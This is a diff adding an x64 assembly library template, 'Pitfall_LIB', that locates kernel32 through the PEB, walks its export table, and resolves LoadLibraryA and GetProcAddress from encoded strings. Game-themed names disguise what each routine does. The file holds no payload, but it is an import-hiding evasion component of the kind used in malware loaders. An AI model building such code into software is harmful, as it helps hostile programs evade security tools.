@@ -1,0 +1,454 @@
+#!name##Pitfall_LIB
+#!types##support
+#!subTypes##lib
+#!info##A special library hide import
+#!options##LIB_COMPILER##mingw-x64
+#!options##DLL_NO_DLL##True
+#!lang##asm
+#!system_FLAG##[W]
+#!reqFood##PF_text##TEXT_title1##text database
+
+{% set PFL_base = TOOL.AsmSh_make_table(data=PF_text, set_as_default=True)%}
+
+bits 64
+default rel
+
+
+%define PITFALL_TITLE_BUFFER 8192
+%define PITFALL_NAME_BUFFER 128
+
+global PITF_get
+global PITF_Init
+global PITF_show_item
+global PITF_title
+
+extern lstrcmpA
+
+
+section .data     
+    {{TOOL.AsmSh_build_var(PF_text, "pitf_t")}}
+    
+    pitf_item_player1: dd {{TOOL.AsmSh_encode("LoadLibraryA")}}; LoadLibraryA
+    pitf_item_player2: dd {{TOOL.AsmSh_encode("GetProcAddress")}}; GetProcAddress
+    {% set _ = TOOL.AsmSh_reset_table() %}
+
+section .bss
+    pitf_main_player: resq 1    ;kernel32 address
+    pitf_main_weapon: resq 1    ; export table address
+    pitf_intro: resb PITFALL_TITLE_BUFFER   ; buffer for title text
+    pitf_name_buff: resb PITFALL_NAME_BUFFER    ; buffer for function name
+    pitf_item_hp: resq 1    ; LoadLibraryA address
+    pitf_item_mana: resq 1  ; GetProcAddress address
+    pitf_item_bag1: resq 1  ; buffer 1
+    pitf_item_bag2: resq 1
+    pitf_item_bag3: resq 1
+    pitf_item_equ1: resb PITFALL_NAME_BUFFER    ; temp buffer
+
+section .text
+
+%macro MACRO_PITF_COPY 1
+    push rsi
+    push rdi
+    push rbx
+    push r10
+    
+    ; reset buffer
+    xor rdi, rdi
+    lea rbx, pitf_item_equ1
+    %%clear:
+        cmp rdi, PITFALL_NAME_BUFFER
+        je %%clear_end
+        mov byte [rbx + rdi], 0
+        inc rdi
+        jmp %%clear
+    
+    %%clear_end:
+        xor rdi, rdi
+        mov rsi, %1
+        ;lea rsi, [%1]
+    %%copy:
+        mov byte r10b, [rsi + rdi]
+        cmp r10b, 0
+        je %%copy_end
+        mov byte [rbx + rdi], r10b
+        inc rdi
+        jmp %%copy
+     
+     %%copy_end:
+        pop r10
+        pop rbx
+        pop rdi
+        pop rsi
+
+%endmacro
+
+
+PITF_Init:
+; Initialize module
+; REQUIREMENTS: stack allign to 16
+    push rbp
+    mov rbp, rsp
+    sub rsp, 48
+    call PITF_setup_game
+    add rsp, 48
+    pop rbp
+    ret
+
+PITF_title:
+; return pointer to 'title'
+; REQUIREMENTS: stack allign to 16
+; OUT: rax - pointer to 'pitf_intro'
+    push rbp
+    mov rbp, rsp
+    
+    lea rax, [pitf_intro]
+    
+    pop rbp
+    ret
+    
+PITF_setup_game:
+; Performs all required steps to operate
+; REQUIREMENTS: stack allign to 16
+    push rbp
+    mov rbp, rsp
+    sub rsp, 8  ;allign stack
+    
+    sub rsp, 40
+    call PITF_setup_player
+    call PITF_prepare_weapon
+    ; get LoadLibraryA addr
+    mov rcx, pitf_item_player1
+    call PITF_show_item
+    mov rcx, rax
+    lea rdx, [pitf_item_bag1]
+    call PITF_get_item
+    lea rcx, [pitf_item_hp]
+    mov [rcx], rax
+    ; get GetProcAddress addr
+    mov rcx, pitf_item_player2
+    call PITF_show_item
+    mov rcx, rax
+    lea rdx, [pitf_item_bag1]
+    call PITF_get_item
+    lea rcx, [pitf_item_mana]
+    mov [rcx], rax
+    add rsp, 40
+    
+    add rsp, 8
+    pop rbp
+    ret
+
+PITF_get:
+; get function address from kernel32 or other library
+; REQUIREMENTS: stack allign to 16
+; IN: rcx - encoded function name
+; IN: rdx - encoded dll name or '0'
+; OUT: rax - function address, '0' - false
+    push rbp
+    mov rbp, rsp
+    sub rsp, 24
+    mov [rbp-8], rcx    ; func name
+    mov [rbp-16], rdx   ; dll name
+    
+    ; check library
+    cmp rdx, 0
+    je .load_kfunc
+    
+    ; load_library
+    sub rsp, 40
+    mov rcx, [rbp-16]
+    call PITF_show_item
+    add rsp, 40
+    MACRO_PITF_COPY rax
+    sub rsp, 40
+    mov rcx, [rbp-8]
+    call PITF_show_item
+    mov rcx, rax
+    lea rdx, [pitf_item_equ1]
+    lea r9, [pitf_item_bag1]
+    call PITF_get_weapon
+    add rsp, 40
+    
+    
+    .return:
+        add rsp, 24
+        pop rbp
+        ret
+    
+    .load_kfunc:
+        sub rsp, 40
+        mov rcx, [rbp-8]    ; move func name
+        call PITF_show_item
+        mov rcx, rax
+        lea rdx, [pitf_item_bag1]
+        call PITF_get_item
+        add rsp, 40
+        jmp .return
+
+
+PITF_get_weapon:
+; load DLL library and get function address from library
+; REQUIREMENTS: stack allign to 16
+; IN: rcx - function name
+; IN: rdx - DLL name
+; IN, OUT: r9 - pointer to return address
+; OUT: rax - function address
+    push rbp
+    mov rbp, rsp
+    sub rsp, 40
+    mov [rbp-8], rcx    ; function name
+    mov [rbp-16], rdx   ; dll name
+    mov [rbp-24], r9    ; return addr pointer
+    
+    ; load library
+    sub rsp, 40
+    mov rcx, rdx
+    lea rax, [pitf_item_hp]
+    mov rax, [rax]
+    call rax    ; call LoadLibraryA
+    add rsp, 40
+    cmp rax, 0
+    je .return_null
+    
+    ; get func address
+    sub rsp, 40
+    mov rcx, rax    ; module handle
+    mov rdx, [rbp-8]    ; func name
+    lea rax, [pitf_item_mana]
+    mov rax, [rax]
+    call rax    ; call GetProcAddress
+    add rsp, 40
+    cmp rax, 0
+    je .return_null
+    
+    ; return func address
+    mov r9, [rbp-24]
+    mov [r9], rax
+    
+    
+    
+    .return:
+        add rsp, 40
+        pop rbp
+        ret
+    
+    .return_null:
+        xor rax, rax
+        mov rcx, [rbp-24]
+        mov qword [rcx], 0
+        jmp .return
+
+PITF_get_item:
+; get function address from kernel32
+; REQUIREMENTS: stack allign to 16
+; IN: rcx - function name
+; IN, OUT: rdx - pointer to return address
+; OUT: rax - function address
+    push rbp
+    mov rbp, rsp
+    sub rsp, 24
+    mov [rbp-8], rdx    ; save pointer
+    mov [rbp-16], rcx   ; save function name
+    push rbx
+    push r12
+    push r13
+    push r14
+    push rsi
+    push rdi
+    
+    .begin:
+        lea rbx, [pitf_main_player]
+        mov rbx, [rbx]  ; kernel32
+        lea r12, [pitf_main_weapon]
+        mov r12, [r12]  ; export table
+        xor rsi, rsi    ; counter
+        xor r13, r13
+        xor rdi, rdi
+        mov r13d, [r12 + 0x14]    ; get number of functions
+
+    .loop:
+        cmp rsi, r13    ; compare counter to number of functions
+        jg .not_find
+        ; get function name
+        mov edi, [r12 + 0x20]   ; RVA function name
+        add rdi, rbx    ; RVA function name + kernel32 address
+        mov edi, [rdi + 4 * rsi]    ; get next entry RVA function name in table
+        add rdi, rbx    ; function name address + kernel32 address
+        
+        ;compare function name
+        sub rsp, 40
+        mov rcx, rdi
+        mov rdx, [rbp-16]
+        call lstrcmpA
+        add rsp, 40
+        cmp rax, 0
+        je .finded
+        
+        inc rsi ; counter + 1
+        jmp .loop
+        
+        
+    .return:
+        pop rdi
+        pop rsi
+        pop r14
+        pop r13
+        pop r12
+        pop rbx
+        add rsp, 24
+        pop rbp
+        ret
+    
+    .finded:
+        mov edi, [r12 + 0x24]   ; get AddressOfNameOrdinals RVA (dword)
+        add rdi, rbx     ; Name Ordinals + kernel32 address
+        xor rcx, rcx
+        mov cx, [rdi + 2 * rsi] ; get function index (word) to function address
+        mov edi, [r12 + 0x1c]   ; get AddressOfFunctions RVA
+        add rdi, rbx    ; Address of function + kernel32 address
+        mov edi, [rdi + 4 * rcx]    ; get RVA function address
+        add rdi, rbx    ; function address + kernel32 address
+        
+        mov rax, [rbp - 8]
+        mov [rax], rdi  ; move function address to pointer
+        mov rax, [rax]  
+        jmp .return
+        
+    
+    .not_find:
+        mov rax, [rbp-8]
+        mov qword [rax], 0    ; return False
+        mov rax, 0    ; return False
+        jmp .return
+        
+    
+
+PITF_show_item:
+; decrypt function name
+; REQUIREMENTS: stack allign to 16
+; IN: rcx - encrypted func name (dword)
+; OUT: rax - pointer to decrypted func name
+    push rbp
+    mov rbp, rsp
+    push rbx
+    push rdx
+    push r9
+    push r10
+    push r11
+        
+    ; clear buffer
+    xor rbx, rbx
+    xor rdx, rdx
+    lea r9, [pitf_name_buff]
+    .clear_buff:
+        mov byte bl, [r9 + rdx]
+        cmp bl, 0
+        je .clear_end
+        mov byte [r9 + rdx], 0
+        inc rdx
+        jmp .clear_buff
+     
+     .clear_end:
+        xor rdx, rdx
+        xor rbx, rbx
+        xor r10, r10
+        xor r11, r11
+     
+     lea rbx, [pitf_intro]
+     .decode:
+        mov r10d, [rcx + 4 * rdx]    ; get first index from func name
+        cmp r10d, 0
+        je .add_zero
+        mov byte r11b, [rbx + r10]
+        mov byte [r9 + rdx], r11b 
+        inc rdx
+        jmp .decode
+    
+    .add_zero:
+        mov byte [r9 + rdx], 0
+        
+
+    .return:
+        lea rax, [pitf_name_buff]
+        pop r11
+        pop r10
+        pop r9
+        pop rdx
+        pop rbx
+        pop rbp
+        ret
+        
+
+
+
+
+PITF_prepare_weapon:
+; combines parts of text into one text
+; REQUIREMENTS: stack allign to 16
+    push rbp
+    mov rbp, rsp
+    sub rsp, 8
+    
+    lea rax, pitf_intro
+    lea rbx, pitf_t_all
+    xor rcx, rcx    ; pitf_intro counter
+    xor r9, r9  ; pitf_intro byte index
+    xor rdx, rdx
+    .main_copy:
+        mov rdx, [rbx + 8 * rcx]
+        ; check end of struct 
+        cmp rdx, 0
+        je .return
+        xor rsi, rsi
+        xor rdi, rdi
+        .copy_var:
+            mov byte dil, [rdx + rsi]
+            cmp dil, 0
+            je .end_var
+            mov byte [rax + r9], dil    ; put bytes in pitf_intro
+            inc r9  ; pitf_intro byte index + 1
+            inc rsi ; var index + 1
+            jmp .copy_var
+    
+    .return:
+        add rsp, 8
+        pop rbp
+        ret
+        
+    .end_var:
+        inc rcx ; pitf_intro counter + 1
+        jmp .main_copy
+
+PITF_setup_player:
+; find kernel32 and export table address
+; REQUIREMENTS: stack allign to 16
+    push rbp
+    mov rbp, rsp
+    push rbx    ; save rbx
+    push rsi    ; save rsi
+    push rdi    ; save rdi
+   
+    xor rbx, rbx
+    mov rbx, gs:[0x60]  ; Get address of PEB struct
+    mov rbx, [rbx+0x18] ; Get PEB_LDR_DATA address
+    mov rbx, [rbx+0x20] ; Get InMemoryOrderModuleList
+    mov rbx, [rbx]  ; 1st entry in InMemoryOrderModuleList (ntdll.dll)
+    mov rbx, [rbx]  ; 2st entry in InMemoryOrderModuleList (kernel32.dll)
+    mov rsi, [rbx+0x20]  ; Get kernel32.dll address
+    lea rdi, [pitf_main_player]
+    mov [rdi], rsi  ; save kernel32.dll address
+    
+    xor rdi, rdi
+    mov edi, [rsi + 0x3c]   ; RVA PE file signature
+    add rdi, rsi    ; RVA PE + kernel32 addr
+    add rdi, 0x88   ; 0x88 bytes after the PE signature is the RVA for the Export Table
+    mov edi, [rdi]  ; get RVA Export Table
+    add rdi, rsi    ; RVA Export Table + kernel32 address
+    lea rbx, [pitf_main_weapon]
+    mov [rbx], rdi  ; save Export Table address
+    ; restore registry
+    pop rdi
+    pop rsi
+    pop rbx
+    pop rbp
+    ret
